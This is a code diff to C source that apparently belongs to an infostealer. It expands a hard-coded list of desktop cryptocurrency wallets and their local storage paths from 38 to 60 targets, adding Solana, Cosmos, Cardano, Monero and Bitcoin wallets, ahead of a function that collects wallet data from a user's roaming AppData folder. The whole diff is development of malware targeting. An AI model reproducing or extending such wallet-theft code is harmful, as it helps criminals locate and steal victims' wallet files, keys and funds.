@@ -27,7 +27,7 @@ static int wd_ensure_k32(void) {
     return 1;
 }
 
-// 38 desktop wallet names and paths
+// 60 desktop wallet names and paths
 static const char *desktop_names[] = {
     "Exodus", "Electrum", "Atomic Wallet", "Wasabi Wallet",
     "Coinomi", "Guarda Wallet", "Jaxx Liberty", "MultiBit HD",
@@ -38,7 +38,27 @@ static const char *desktop_names[] = {
     "Trezor Suite", "MyEtherWallet", "MyCrypto", "MetaMask Desktop",
     "Trust Wallet", "Bitcoin Wallet", "Litecoin Wallet", "Dash Wallet",
     "Vertcoin", "Groestlcoin", "Komodo", "PIVX",
-    "MyMonero", "Jaxx"
+    "MyMonero", "Jaxx",
+    /* Solana */
+    "Phantom Desktop", "Solflare Desktop", "Backpack",
+    /* Cosmos */
+    "Keplr Desktop",
+    /* Polkadot */
+    "Polkadot-JS Desktop",
+    /* Cardano */
+    "Daedalus", "Lace",
+    /* Tezos */
+    "Umami",
+    /* Monero */
+    "Feather Wallet",
+    /* DeFi */
+    "Rabby Desktop",
+    /* Bitcoin-focused */
+    "Sparrow Wallet", "Specter Desktop", "BlueWallet",
+    "Phoenix Wallet", "Muun Wallet", "BTCPay Server",
+    /* Additional */
+    "Samourai Wallet", "Bisq", "Nunchuk",
+    "Zelcore", "TokenPocket", "Safe Desktop"
 };
 
 static const char *desktop_paths[] = {
@@ -79,10 +99,41 @@ static const char *desktop_paths[] = {
     "Komodo",
     "PIVX",
     "MyMonero",
-    "com.liberty.jaxx\\IndexedDB\\file_0.indexeddb.leveldb"
+    "com.liberty.jaxx\\IndexedDB\\file_0.indexeddb.leveldb",
+    /* Solana */
+    "Phantom\\Local Storage\\leveldb",
+    "Solflare\\Local Storage\\leveldb",
+    "Backpack\\Local Storage\\leveldb",
+    /* Cosmos */
+    "Keplr\\Local Storage\\leveldb",
+    /* Polkadot */
+    "polkadot-js\\Local Storage\\leveldb",
+    /* Cardano */
+    "Daedalus",
+    "Lace",
+    /* Tezos */
+    "Umami",
+    /* Monero */
+    "FeatherWallet",
+    /* DeFi */
+    "Rabby\\Local Storage\\leveldb",
+    /* Bitcoin-focused */
+    "Sparrow",
+    "SpecterDesktop",
+    "BlueWallet",
+    "Phoenix",
+    "Muun",
+    "BTCPayServer",
+    /* Additional */
+    "SamouraiWallet",
+    "Bisq",
+    "Nunchuk",
+    "Zelcore",
+    "TokenPocket\\Local Storage\\leveldb",
+    "Safe\\Local Storage\\leveldb"
 };
 
-#define DESKTOP_WALLET_COUNT 38
+#define DESKTOP_WALLET_COUNT 60
 
 WalletDesktopData *collect_wallet_desktop(const char *roaming_app_data, size_t *count) {
     *count = 0;
